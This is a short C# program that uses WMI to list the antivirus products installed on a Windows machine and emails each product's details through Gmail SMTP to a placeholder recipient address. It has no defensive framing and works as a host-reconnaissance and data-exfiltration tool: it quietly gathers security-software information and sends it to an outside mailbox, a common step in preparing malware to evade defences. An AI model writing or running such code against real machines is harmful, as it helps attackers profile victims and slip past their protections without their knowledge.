using System.Management;
using System.Net.Mail;
using System.Net;
using System.Net.NetworkInformation;
using System.ComponentModel.DataAnnotations;

class Program
{
    static void Main(string[] args)
    {


        //~ArMin~



        using (var searcher = new ManagementObjectSearcher

            (@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "SELECT * FROM AntiVirusProduct"))

        {
            var SEARCHERoUT = searcher.Get();
            foreach (var item in SEARCHERoUT)
            {
                //Mail To An Email Adredss
                string x = item.ToString();
                Console.WriteLine(item["displayName"].ToString());
                sendMail(x);


            }
        }



        static void sendMail(string text)
        {
            using (MailMessage mail  = new MailMessage())
            {
                mail.From = new MailAddress("YOUREMAIL");
                mail.To.Add("RECIEVER_MAIL");
                mail.Subject = "Hey Big Dady";
                mail.Body = text;
                mail.IsBodyHtml = true;

                using (SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587))
                {
                    smtp.Credentials = new NetworkCredential("YOUREMAIL", "YOUR_GENERATEDPASS");
                    smtp.EnableSsl = true;
                    smtp.Send(mail);
                }

            }

        }


    }
}

